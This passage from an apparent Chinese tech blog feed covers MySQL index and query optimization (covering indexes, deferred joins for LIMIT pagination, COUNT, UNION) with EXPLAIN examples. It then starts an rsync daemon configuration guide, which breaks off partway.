为这个查询选择了索引<code>(user_group_id,trade_amount)</code>，如果不考虑特殊情况，这看起来没有任何问题，但实际情况是这张表的大多数数据都是从老系统中迁移过来的，由于新老系统的数据不兼容，所以就给老系统迁移过来的数据赋予了一个默认的用户组。这种情况下，通过索引扫描的行数跟全表扫描基本没什么区别，索引也就起不到任何作用。</p><p>推广开来说，经验法则和推论在多数情况下是有用的，可以指导我们开发和设计，但实际情况往往会更复杂，实际业务场景下的某些特殊情况可能会摧毁你的整个设计。</p><p><strong>避免多个范围条件</strong></p><p>实际开发中，我们会经常使用多个范围条件，比如想查询某个时间段内登录过的用户：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user.* from user <span class="built_in">where</span> login_time > <span class="string">'2017-04-01'</span> and age between 18 and 30;</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个查询有一个问题：它有两个范围条件，login_time 列和 age 列，MySQL 可以使用 login_time 列的索引或者 age 列的索引，但无法同时使用它们。</p><p><strong>覆盖索引</strong></p><p>如果一个索引包含或者说覆盖所有需要查询的字段的值，那么就没有必要再回表查询，这就称为覆盖索引。覆盖索引是非常有用的工具，可以极大的提高性能，因为查询只需要扫描索引会带来许多好处：</p><ul><li>索引条目远小于数据行大小，如果只读取索引，极大减少数据访问量</li><li>索引是有按照列值顺序存储的，对于 I/O 密集型的范围查询要比随机从磁盘读取每一行数据的 IO 要少的多</li></ul><p><strong>使用索引扫描来排序</strong></p><p>MySQL 有两种方式可以生产有序的结果集，其一是对结果集进行排序的操作，其二是按照索引顺序扫描得出的结果自然是有序的。如果 explain 的结果中type列的值为index表示使用了索引扫描来做排序。</p><p>扫描索引本身很快，因为只需要从一条索引记录移动到相邻的下一条记录。但如果索引本身不能覆盖所有需要查询的列，那么就不得不每扫描一条索引记录就回表查询一次对应的行。这个读取操作基本上是随机 I/O，因此按照索引顺序读取数据的速度通常要比顺序地全表扫描要慢。</p><p>在设计索引时，如果一个索引既能够满足排序，又满足查询，是最好的。</p><p>只有当索引的列顺序和ORDER BY子句的顺序完全一致，并且所有列的排序方向也一样时，才能够使用索引来对结果做排序。如果查询需要关联多张表，则只有ORDER BY子句引用的字段全部为第一张表时，才能使用索引做排序。ORDER BY子句和查询的限制是一样的，都要满足最左前缀的要求（有一种情况例外，就是最左的列被指定为常数，下面是一个简单的示例），其他情况下都需要执行排序操作，而无法利用索引排序。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 最左列为常数，索引：(date,staff_id,customer_id)</span><br><span class="line">select  staff_id,customer_id from demo <span class="built_in">where</span> date = <span class="string">'2015-06-01'</span> order by staff_id,customer_id</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>冗余和重复索引</strong></p><p>冗余索引是指在相同的列上按照相同的顺序创建的相同类型的索引，应当尽量避免这种索引，发现后立即删除。比如有一个索引<code>(A,B)</code>，再创建索引<code>(A)</code>就是冗余索引。冗余索引经常发生在为表添加新索引时，比如有人新建了索引<code>(A,B)</code>，但这个索引不是扩展已有的索引<code>(A)</code>。</p><p>大多数情况下都应该尽量扩展已有的索引而不是创建新索引。但有极少情况下出现性能方面的考虑需要冗余索引，比如扩展已有索引而导致其变得过大，从而影响到其他使用该索引的查询。</p><p><strong>删除长期未使用的索引</strong></p><p>定期删除一些长时间未使用过的索引是一个非常好的习惯。</p><p>关于索引这个话题打算就此打住，最后要说一句，索引并不总是最好的工具，只有当索引帮助提高查询速度带来的好处大于其带来的额外工作时，索引才是有效的。对于非常小的表，简单的全表扫描更高效。对于中到大型的表，索引就非常有效。对于超大型的表，建立和维护索引的代价随之增长，这时候其他技术也许更有效，比如分区表。最后的最后，<strong>explain后再提测是一种美德</strong>。</p><p><strong>特定类型查询优化</strong></p><p><strong>优化 COUNT() 查询</strong></p><p><code>COUNT()</code>可能是被大家误解最多的函数了，它有两种不同的作用，其一是统计某个列值的数量，其二是统计行数。统计列值时，要求列值是非空的，它不会统计 NULL。如果确认括号中的表达式不可能为空时，实际上就是在统计行数。最简单的就是当使用<code>COUNT(*)</code>时，并不是我们所想象的那样扩展成所有的列，实际上，它会忽略所有的列而直接统计行数。</p><p>我们最常见的误解也就在这儿，在括号内指定了一列却希望统计结果是行数，而且还常常误以为前者的性能会更好。但实际并非这样，如果要统计行数，直接使用<code>COUNT(*)</code>，意义清晰，且性能更好。</p><p>有时候某些业务场景并不需要完全精确的<code>COUNT</code>值，可以用近似值来代替，<code>EXPLAIN</code> 出来的行数就是一个不错的近似值，而且执行 <code>EXPLAIN</code> 并不需要真正地去执行查询，所以成本非常低。通常来说，执行<code>COUNT()</code>都需要扫描大量的行才能获取到精确的数据，因此很难优化，MySQL 层面还能做得也就只有覆盖索引了。如果不还能解决问题，只有从架构层面解决了，比如添加汇总表，或者使用 <code>redis</code> 这样的外部缓存系统。</p><p><strong>优化关联查询</strong></p><p>在大数据场景下，表与表之间通过一个冗余字段来关联，要比直接使用JOIN有更好的性能。如果确实需要使用关联查询的情况下，需要特别注意的是：</p><ul><li>确保<code>ON</code>和<code>USING</code>字句中的列上有索引。在创建索引的时候就要考虑到关联的顺序。当表 <code>A</code> 和表 <code>B</code> 用列 <code>c</code> 关联的时候，如果优化器关联的顺序是 <code>A</code>、<code>B</code>，那么就不需要在 <code>A</code> 表的对应列上创建索引。没有用到的索引会带来额外的负担，一般来说，除非有其他理由，只需要在关联顺序中的第二张表的相应列上创建索引（具体原因下文分析）。</li><li>确保任何的<code>GROUP BY</code>和<code>ORDER BY</code>中的表达式只涉及到一个表中的列，这样 MySQL 才有可能使用索引来优化。</li></ul><p>要理解优化关联查询的第一个技巧，就需要理解 MySQL 是如何执行关联查询的。当前 MySQL 关联执行的策略非常简单，它对任何的关联都<strong>执行嵌套循环关联操作</strong>，即先在一个表中循环取出单条数据，然后在嵌套循环到下一个表中寻找匹配的行，依次下去，直到找到所有表中匹配的行为为止。然后根据各个表匹配的行，返回查询中需要的各个列。</p><p>太抽象了？以上面的示例来说明，比如有这样的一个查询：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT A.xx,B.yy FROM A INNER JOIN B USING(c) WHERE A.xx IN (5,6)</span><br></pre></td></tr></tbody></table></figure><p></p><p>假设 MySQL 按照查询中的关联顺序 A、B 来进行关联操作，那么可以用下面的伪代码表示 MySQL 如何完成这个查询：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">outer_iterator = SELECT A.xx,A.c FROM A WHERE A.xx IN (5,6);</span><br><span class="line">outer_row = outer_iterator.next;</span><br><span class="line"><span class="keyword">while</span>(outer_row) {</span><br><span class="line">    inner_iterator = SELECT B.yy FROM B WHERE B.c = outer_row.c;</span><br><span class="line">    inner_row = inner_iterator.next;</span><br><span class="line">    <span class="keyword">while</span>(inner_row) {</span><br><span class="line">        output[inner_row.yy,outer_row.xx];</span><br><span class="line">        inner_row = inner_iterator.next;</span><br><span class="line">    }</span><br><span class="line">    outer_row = outer_iterator.next;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以看到，最外层的查询是根据A.xx列来查询的，A.c上如果有索引的话，整个关联查询也不会使用。再看内层的查询，很明显B.c上如果有索引的话，能够加速查询，因此只需要在关联顺序中的第二张表的相应列上创建索引即可。</p><p><strong>优化 LIMIT 分页</strong></p><p>当需要分页操作时，通常会使用LIMIT加上偏移量的办法实现，同时加上合适的ORDER BY字句。如果有对应的索引，通常效率会不错，否则，MySQL 需要做大量的文件排序操作。</p><p>一个常见的问题是当偏移量非常大的时候，比如：LIMIT 10000 20这样的查询，MySQL 需要查询 10020 条记录然后只返回 20 条记录，前面的 10000 条都将被抛弃，这样的代价非常高。</p><p>优化这种查询一个最简单的办法就是尽可能的使用覆盖索引扫描，而不是查询所有的列。然后根据需要做一次关联查询再返回所有的列。对于偏移量很大时，这样做的效率会提升非常大。考虑下面的查询：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT film_id,description FROM film ORDER BY title LIMIT 50,5;</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果这张表非常大，那么这个查询最好改成下面的样子：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT film.film_id,film.description</span><br><span class="line">FROM film INNER JOIN (</span><br><span class="line">    SELECT film_id FROM film ORDER BY title LIMIT 50,5</span><br><span class="line">) AS tmp USING(film_id);</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里的延迟关联将大大提升查询效率，让 MySQL 扫描尽可能少的页面，获取需要访问的记录后在根据关联列回原表查询所需要的列。</p><p>有时候如果可以使用书签记录上次取数据的位置，那么下次就可以直接从该书签记录的位置开始扫描，这样就可以避免使用OFFSET，比如下面的查询：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM t LIMIT 10000, 10;</span><br><span class="line">-- 改为：</span><br><span class="line">SELECT id FROM t WHERE id > 10000 LIMIT 10;</span><br></pre></td></tr></tbody></table></figure><p></p><p>其他优化的办法还包括使用预先计算的汇总表，或者关联到一个冗余表，冗余表中只包含主键列和需要做排序的列。</p><p><strong>优化 UNION</strong><br>MySQL 处理UNION的策略是先创建临时表，然后再把各个查询结果插入到临时表中，最后再来做查询。因此很多优化策略在UNION查询中都没有办法很好的时候。经常需要手动将WHERE、LIMIT、ORDER BY等字句 “下推” 到各个子查询中，以便优化器可以充分利用这些条件先优化。</p><p>除非确实需要服务器去重，否则就一定要使用UNION ALL，如果没有ALL关键字，MySQL 会给临时表加上DISTINCT选项，这会导致整个临时表的数据做唯一性检查，这样做的代价非常高。当然即使使用 ALL 关键字，MySQL 总是将结果放入临时表，然后再读出，再返回给客户端。虽然很多时候没有这个必要，比如有时候可以直接把每个子查询的结果返回给客户端。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>理解查询是如何执行以及时间都消耗在哪些地方，再加上一些优化过程的知识，可以帮助大家更好的理解 MySQL，理解常见优化技巧背后的原理。希望本文中的原理、示例能够帮助大家更好的将理论和实践联系起来，更多的将理论知识运用到实践中。</p><p>其他也没啥说的了，给大家留两个思考题吧，可以在脑袋里想想答案，这也是大家经常挂在嘴边的，但很少有人会思考为什么？</p><ol><li>有非常多的程序员在分享时都会抛出这样一个观点：尽可能不要使用存储过程，存储过程非常不容易维护，也会增加使用成本，应该把业务逻辑放到客户端。既然客户端都能干这些事，那为什么还要存储过程？</li><li>JOIN本身也挺方便的，直接查询就好了，为什么还需要视图呢？</li></ol><p>参考资料</p><ul><li><a href="https://segmentfault.com/a/1190000004690721" target="_blank" rel="noopener">由 B-/B+树看 MySQL索引结构</a></li><li>MySQL 技术内幕：InnoDB 存储引擎(第 2 版)</li><li>高性能 MySQL(第 3 版)</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpeg&quot; class=&quot;full-image&quot; alt=&quot;
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>MySQL 优化之 Covering Index</title>
    <link href="https://jiemin.wang/2019/03/29/CoveringIndex/"/>
    <id>https://jiemin.wang/2019/03/29/CoveringIndex/</id>
    <published>2019-03-29T05:22:16.000Z</published>
    <updated>2019-03-29T09:59:50.159Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="hehe.jpg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>为什么我老爸不是李嘉诚，为什么我长的这么帅，但是要掉头发呢，你们长这么丑，却不掉头发呢？</strong></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在网上随便搜搜，就能找到大把的关于 MySQL 优化的文章，不过里面很多都不准确，说个常见的：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT a FROM ... WHERE b = ...</span><br></pre></td></tr></tbody></table></figure><p></p><p>一般来说，很多文章会告诫你类似这样的查询，不要在 “a” 字段上建立索引，而应该在 “b” 上建立索引。这样做确实不错，但是很多时候这并不是最佳结果。为什么这样说？这还得先从索引来说起。</p><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><p>MySQL 官方对索引的定义为：索引（Index）是帮助 MySQL 高效获取数据的数据结构。提取句子主干，就可以得到索引的本质：索引是数据结构。</p><p>在 MySQL 中，索引属于存储引擎级别的概念，不同存储引擎对索引的实现方式是不同的，本文讨论的主要是 InnoDB 的 B+Tree 索引，它又可以分为两类：</p><ul><li>聚簇索引</li><li>非聚簇索引</li></ul><p>聚簇索引又称为聚集索引或主键索引，它并不是一种单独的索引类型，而是一种数据存储方式。在 InnoDB 中，表数据文件本身就是按 B+Tree 组织的一个索引结构，这棵树的叶子节点称为 leaf page，其 data 域保存了完整的数据记录。也即我们所说的数据行即索引，索引即数据。<br><img src="/2019/03/29/CoveringIndex/Primary_key.jpg" title="Primary_key"></p><p>非聚簇索引是相对于聚簇索引来说的，我们又称为辅助索引或二级索引。 InnoDB 的二级索引 data 域存储的是相应记录主键的值而不是物理位置的指针。<br><img src="/2019/03/29/CoveringIndex/Secoudary_key.jpg" title="Secoudary_key"></p><h4 id="回表"><a href="#回表" class="headerlink" title="回表"></a>回表</h4><p>了解了 InnoDB 索引的实现方式，我们就很容易理解 “回表” 这个概念了。</p><p>聚簇索引这种实现方式使得按主键的搜索十分高效，但是二级索引搜索需要检索两遍索引：首先检索二级索引获得主键，然后用主键到主索引中检索获得记录。</p><p>让我们回到开头说的那个例子：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT a FROM ... WHERE b = ...</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们先来分析一下查询的处理过程：在执行查询时，系统会查询 “b” 索引进行定位，然后回表查询需要的数据 “a”，也就是说，在这个过程中存在两次查询，一次是查询索引，另一次是查询表。</p><p>那有没有办法用一次查询搞定问题呢？有，就是 Covering Index！</p><blockquote><p>说到这里你可能会想起来 MySQL5.6 中引入的 MRR（Multi-Range Read，多范围读），它是专门来优化二级索引的范围扫描并且需要回表的情况。它的原理是，将多个需要回表的二级索引根据主键进行排序，然后一起回表，将原来的回表时进行的随机 IO，转变成顺序 IO。MRR 的优势是将多个随机 IO 转换成较少数量的顺序 IO，所以对于 SSD 来说价值还是有的，但是相比机械磁盘来说意义小一些。</p></blockquote><h2 id="Covering-Index"><a href="#Covering-Index" class="headerlink" title="Covering Index"></a>Covering Index</h2><p>所谓 Covering Index，就是说不必查询表文件，单靠查询索引文件即可完成。使用覆盖索引的好处是辅助索引不包含整行记录的所有信息，故其大小要远小于聚集索引，因此可以减少大量的 IO 操作。</p><p>具体到上边的例子中就是建立一个复合索引 (b, a)，当查询进行时，通过复合索引的 “b” 部分去定位，至于需要的数据 “a”，立刻就可以在索引里得到，从而省略了表查询的过程。</p><p>如果你想利用 Covering Index，那么就要注意 SELECT 方式，只 SELECT 必要的字段，千万别SELECT * FROM …，因为我们不太可能把所有的字段一起做索引，虽然可以那样做，但那样会让索引文件过大，结果反倒会弄巧成拙。</p><p>如何才能确认查询使用了 Covering Index 呢？很简单，使用 EXPLAIN 即可！只要在 Extra 里出现Using index就说明使用的是 Covering Index。</p><p>这里再举两个栗子，让大家印象深点。</p><p>例子一</p><p>在文章系统里统计总数的时候，一般的查询是这样的：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*) FROM article WHERE category_id = ...</span><br></pre></td></tr></tbody></table></figure><p></p><p>当我们在<code>category_id</code>建立索引后，这个查询使用的就是 Covering Index。</p><blockquote><p>参考文档：<a href="https://www.percona.com/blog/2007/04/10/count-vs-countcol/" target="_blank" rel="noopener">COUNT(*) vs COUNT(col)</a></p></blockquote><p>例子二<br>在文章系统里分页显示的时候，一般的查询是这样的：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id, title, content FROM article ORDER BY created DESC LIMIT 10000, 10;</span><br></pre></td></tr></tbody></table></figure><p></p><p>通常这样的查询会把索引建在created字段（其中id是主键），不过当LIMIT偏移很大时，查询效率仍然很低，这时这个查询最好改成下面的样子：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT id, title, content FROM article</span><br><span class="line">INNER JOIN (</span><br><span class="line">    SELECT id FROM article ORDER BY created DESC LIMIT 10000, 10</span><br><span class="line">) AS page USING(id);</span><br></pre></td></tr></tbody></table></figure><p></p><p>此时，就可以在子查询里利用上 Covering Index，快速定位 id，查询效率嗷嗷的。</p><p>基于我的测试数据，这两条语句的查询耗时分别是 “0.08 秒” 和“0.01 秒以内”，8 倍的差距啊！不由又想起了地精的经典语录<br></p><blockquote class="blockquote-center"><p>时间就是金钱，我的朋友！</p></blockquote><p></p><blockquote><p>补充：InnoDB 引擎层是会对二级索引做自动扩展，优化器能识别出扩展的主键。详情可以参考<a href="https://blog.51cto.com/huanghualiang/1607496" target="_blank" rel="noopener">这篇文章</a>。</p></blockquote><p>我们再来看看这两条语句分别对应的执行计划<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql> EXPLAIN SELECT SQL_NO_CACHE id, title, content FROM article ORDER BY created DESC LIMIT 10000, 10;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+-------+----------+----------------+</span><br><span class="line">| id | select_type | table   | partitions | <span class="built_in">type</span> | possible_keys | key  | key_len | ref  | rows  | filtered | Extra          |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+-------+----------+----------------+</span><br><span class="line">|  1 | SIMPLE      | article | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 99210 |   100.00 | Using filesort |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+-------+----------+----------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span>, 2 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql> EXPLAIN SELECT SQL_NO_CACHE id, title, content FROM article INNER JOIN ( SELECT id FROM article ORDER BY created DESC LIMIT 10000, 10 ) AS page USING(id);</span><br><span class="line">+----+-------------+------------+------------+--------+---------------+-------------+---------+---------+-------+----------+----------------------------------+</span><br><span class="line">| id | select_type | table      | partitions | <span class="built_in">type</span>   | possible_keys | key         | key_len | ref     | rows  | filtered | Extra                            |</span><br><span class="line">+----+-------------+------------+------------+--------+---------------+-------------+---------+---------+-------+----------+----------------------------------+</span><br><span class="line">|  1 | PRIMARY     | <derived2> | NULL       | ALL    | NULL          | NULL        | NULL    | NULL    | 10010 |   100.00 | NULL                             |</span><br><span class="line">|  1 | PRIMARY     | article    | NULL       | eq_ref | PRIMARY       | PRIMARY     | 4       | page.id |     1 |   100.00 | NULL                             |</span><br><span class="line">|  2 | DERIVED     | article    | NULL       | index  | NULL          | idx_created | 5       | NULL    | 10010 |   100.00 | Backward index scan; Using index |</span><br><span class="line">+----+-------------+------------+------------+--------+---------------+-------------+---------+---------+-------+----------+----------------------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span>, 2 warnings (0.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>通过 EXPLAIN 我们可以很明显的看出，第一个查询没有用到索引，Extra 里是 “Using filesort”，这是我们应该尽量避免的情况。而第二个的 Extra 是 “Using index”，所以这两者间效率上的差距就显而易见了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Covering Index 并不是什么很难的概念，但是有些人还不了解它或忽视它的价值，希望本文能给你提个醒。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://yq.aliyun.com/articles/62419" target="_blank" rel="noopener">MySQL 覆盖索引</a></li><li><a href="https://www.jianshu.com/p/fa24238d84a9" target="_blank" rel="noopener">MySQL 索引背后的数据结构及算法原理</a></li><li><a href="https://segmentfault.com/a/1190000010264071" target="_blank" rel="noopener">MySQL 认识索引</a></li><li><a href="https://huoding.com/2018/02/27/656" target="_blank" rel="noopener">谈谈 SQL 查询中回表对性能的影响</a></li><li><a href="http://www.cnblogs.com/digdeep/p/4995039.html" target="_blank" rel="noopener">MySQL 优化之 MRR (Multi-Range Read: 二级索引合并回表)</a></li><li><a href="https://blog.51cto.com/huanghualiang/1607496" target="_blank" rel="noopener">关于 MySQL InnoDB 表的二级索引是否加入主键列的问题解释</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;hehe.jpg&quot; class=&quot;full-image&quot; alt=&quot;a
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>rsync 命令详解</title>
    <link href="https://jiemin.wang/2019/03/29/rsync/"/>
    <id>https://jiemin.wang/2019/03/29/rsync/</id>
    <published>2019-03-29T04:53:22.000Z</published>
    <updated>2019-03-29T05:18:58.858Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是-Rsync"><a href="#什么是-Rsync" class="headerlink" title="什么是 Rsync"></a>什么是 Rsync</h2><p>Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件。Rsync 使用所谓的 “Rsync 算法” 来使本地和远 程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。</p><p>Rsync 本来是用于替代 rcp 的一个工具，目前由 <a href="https://rsync.samba.org/" target="_blank" rel="noopener">samba</a> 维护，所以 rsync.conf 文件的格式类似于 Samba 的 主配置文件。Rsync 可以通过 rsh 或 ssh 使用，也能以 daemon 模式去运行，在以 daemon 方式运行时 Rsync server 会打开一个 873 端口，等待客户端去连接。连接时，Rsync server 会检查口令是否相符，若通过口令查核，则可以开始进行文件传输。第一次连通完成时，会把整份文件传输一次，以后则就只需进行增量备份。</p><p>Rsync 支持大多数的类 Unix 系统，无论是 Linux、Solaris 还是 BSD 上都经过了良好的测试。此外，它在 windows 平台下也有相应的版本，如 cwRsync 和 Sync2NAS 等工具。</p><p>Rsync 的基本特点如下：</p><ol><li>可以镜像保存整个目录树和文件系统；</li><li>可以很容易做到保持原来文件的权限、时间、软硬链接等；</li><li>无须特殊权限即可安装；</li><li>优化的流程，文件传输效率高；</li><li>可以使用 rsh、ssh 等方式来传输文件，当然也可以通过直接的 socket 连接；</li><li>支持匿名传输。</li></ol><h2 id="Rsync-同步算法"><a href="#Rsync-同步算法" class="headerlink" title="Rsync 同步算法"></a>Rsync 同步算法</h2><p>Rsync 只所以同步文件的速度相当快，是因为 “Rsync 同步算法” 能在很短的时间内计算出需要备份的数据，关于 Rsync 的同步算法描述如下：</p><p>假定在 1 号和 2 号两台计算机之间同步相似的文件 A 与 B，其中 1 号对文件 A 拥有访问权，2 号对文件 B 拥有访问权。并且假定主机 1 号与 2 号之间的网络带宽很小。那么 rsync 算法将通过下面的五个步骤来完成：</p><ol><li>2 号将文件 B 分割成一组不重叠的固定大小为 S 字节的数据块，最后一块可能会比 S 小。</li><li>2 号对每一个分割好的数据块执行两种校验：一种是 32 位的滚动弱校验，另一种是 128 位的 MD4 强校验</li><li>2 号将这些校验结果发给 1 号。</li><li>1 号通过搜索文件 A 的所有大小为 S 的数据块 (偏移量可以任选，不一定非要是 S 的倍数)，来寻找与文件 B 的某一块有着相同的弱校验码和强校验码的数据块。这项工作可以借助滚动校验的特性很快完成。</li><li>1 号发给 2 号一串指令来生成文件 A 在 2 号上的备份。这里的每一条指令要么是对文件 B 经拥有某一个数据块而不须重传的证明，要么是一个数据块，这个数据块肯定是没有与文件 B 的任何一个数据块匹配上的。</li></ol><h2 id="Rsync-参数说明"><a href="#Rsync-参数说明" class="headerlink" title="Rsync 参数说明"></a>Rsync 参数说明</h2><p>配置文件：<code>rsyncd.conf</code></p><h4 id="全局参数"><a href="#全局参数" class="headerlink" title="全局参数"></a>全局参数</h4><p>在文件中，<code>[module]</code>之前的所有参数都是全局参数，当然也可以在全局参数部分定义模块参数，这时候该参数的值就是所有模块的默认值。</p><p><code>port</code>指定后台程序使用的端口号，默认为 <code>873</code>。</p><p><code>motd file</code>用来指定一个消息文件，当客户连接服务器时该文件的内容显示给客户，默认是没有 <code>motd</code> 文件的。</p><p><code>log file</code>指定 <code>rsync</code> 的日志文件，而不将日志发送给 <code>syslog</code>。比如可指定为 <code>/var/log/rsyncd.log</code>。</p><p><code>pid file</code>指定 <code>rsync</code> 的 <code>pid</code> 文件，通常指定为 <code>/var/run/rsyncd.pid</code>。</p><p><code>syslog facility</code>指定 <code>rsync</code> 发送日志消息给 <code>syslog</code> 时的消息级别，常见的消息级别是：</p><ul><li>daemon 默认值</li><li>uth</li><li>authpriv</li><li>cron</li><li>daemon</li><li>ftp</li><li>kern</li><li>lpr</li><li>mail</li><li>news</li><li>security</li><li>sys-log</li><li>user</li><li>uucp</li><li>local0</li><li>local1</li><li>local2</li><li>local3</li><li>local4</li><li>local5</li><li>local6</li><li>local7</li></ul><h4 id="模块参数"><a href="#模块参数" class="headerlink" title="模块参数"></a>模块参数</h4><p>主要是定义服务器哪个目录要被同步。其格式必须为<code>“[module]”</code>形式，这个名字就是在 <code>rsync</code> 客户端看到的名字，其实有点象 <code>Samba</code> 服务器提供的共享名。而服务器真正同步的数据是通过 <code>path</code> 来指定的。我们可以根据自己的需要，来指定多个模块，模块中可以定义以下参数：</p><p><code>comment</code>给模块指定一个描述，该描述连同模块名在客户连接得到模块列表时显示给客户。默认没有描述定义。</p><p><code>path</code>指定该模块的供备份的目录树路径，该参数是必须指定的。</p><p><code>use chroot</code>如果指定为 <code>true</code>，那么 <code>rsync</code> 在传输文件以前首先 <code>chroot</code> 到 <code>path</code> 参数所指定的目录下。这样做的原因是实现额外的安全防护，但是缺点是需要以 <code>root</code> 权限，并且不能备份指向外部的符号连接所指向的目录文件。默认值为 <code>true</code>。</p><p><code>uid</code>指定当该模块传输文件时守护进程应该具有的 <code>uid</code>，配合 <code>gid</code>选项使用可以确定哪些可以访问怎么样的文件权限，默认值是<code>”nobody”</code>。</p><p><code>gid</code>指定当该模块传输文件时守护进程应该具有的 <code>gid</code>。默认值为<code>”nobody”</code>。</p><p><code>max connections</code>指定该模块的最大并发连接数量以保护服务器，超过限制的连接请求将被告知随后再试。默认值是 <code>0</code>，也就是没有限制。</p><p><code>list</code>该选项设定当客户请求可以使用的模块列表时，该模块是否应该被列出。如果设置该选项为 <code>false</code>，可以创建隐藏的模块。默认值是 <code>true</code>。</p><p><code>read only</code>设定是否允许客户上载文件。如果为 <code>true</code> 那么任何上载请求都会失败，如果为 <code>false</code> 并且服务器目录读写权限允许那么上载是允许的。默认值为 <code>true</code>。</p><p><code>exclude</code>用来指定多个由空格隔开的多个文件或目录 (相对路径)，并将其添加到 <code>exclude</code> 列表中。这等同于在客户端命令中使用<code>--exclude</code>来指定 模式，一个模块只能指定一个 <code>exclude</code> 选项。但是需要注意的一点是该选项有一定的安全性问题，客户很有可能绕过 <code>exclude</code> 列表，如果希望确保特定 的文件不能被访问，那就最好结合 